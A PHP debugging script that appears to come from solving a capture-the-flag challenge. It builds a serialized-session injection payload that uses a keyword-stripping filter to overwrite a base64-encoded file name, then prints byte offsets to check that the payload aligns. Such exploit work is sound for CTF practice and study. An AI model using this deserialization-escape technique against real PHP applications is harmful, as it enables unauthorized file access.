<?php
// Let me debug this more carefully

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$injection = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = 'phpphpflag' . $injection;
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
$filtered = filter($serialized);

echo "Filtered string:\n";
echo $filtered . "\n\n";

// Find the position of s:51:"
$pos = strpos($filtered, 's:51:"');
echo "Position of s:51:\": $pos\n";

// The opening quote is at position $pos + 5
$quote_pos = $pos + 5;
echo "Position of opening quote: $quote_pos\n";
echo "Char at opening quote: '" . $filtered[$quote_pos] . "'\n";

// The content after the opening quote
$content_start = $quote_pos + 1;
echo "Content starts at position: $content_start\n";
echo "Char at content start: '" . $filtered[$content_start] . "'\n";

// Read 51 bytes from content start
$content = substr($filtered, $content_start, 51);
echo "51 bytes of content:\n";
echo $content . "\n\n";

// Check what comes after the 51 bytes
$next_pos = $content_start + 51;
echo "Position after 51 bytes: $next_pos\n";
echo "Char at position $next_pos: '" . $filtered[$next_pos] . "'\n";
echo "Next 5 chars: '" . substr($filtered, $next_pos, 5) . "'\n";

// Let me also print the positions of " in the filtered string
echo "\nPositions of \" in filtered string (after content start):\n";
for ($i = $content_start; $i < strlen($filtered); $i++) {
    if ($filtered[$i] === '"') {
        $relative_pos = $i - $content_start;
        echo "Position $relative_pos (absolute $i): \"\n";
    }
}

